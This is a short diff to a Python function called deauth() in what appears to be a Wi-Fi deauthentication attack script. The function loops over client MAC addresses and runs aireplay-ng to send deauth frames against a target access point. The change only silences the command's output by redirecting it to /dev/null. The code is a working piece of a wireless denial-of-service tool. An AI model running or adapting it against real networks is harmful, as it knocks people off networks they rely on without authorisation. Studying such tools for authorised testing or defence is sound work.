@@ -81,7 +81,8 @@ def deauth():
                 for mac in mac_list:
                     mac_list.remove(mac)
                     if mac not in mac_list and len(mac_list) > 0:
-                        subprocess.Popen(['aireplay-ng', '--deauth', '5', '-a', bssid, '-c', mac, interface])
+                        with open(os.devnull, 'w') as fp:
+                            subprocess.Popen(['aireplay-ng', '--deauth', '5', '-a', bssid, '-c', mac, interface], stdout=fp)
             time.sleep(attack_delay)
     except KeyboardInterrupt:
         clean()
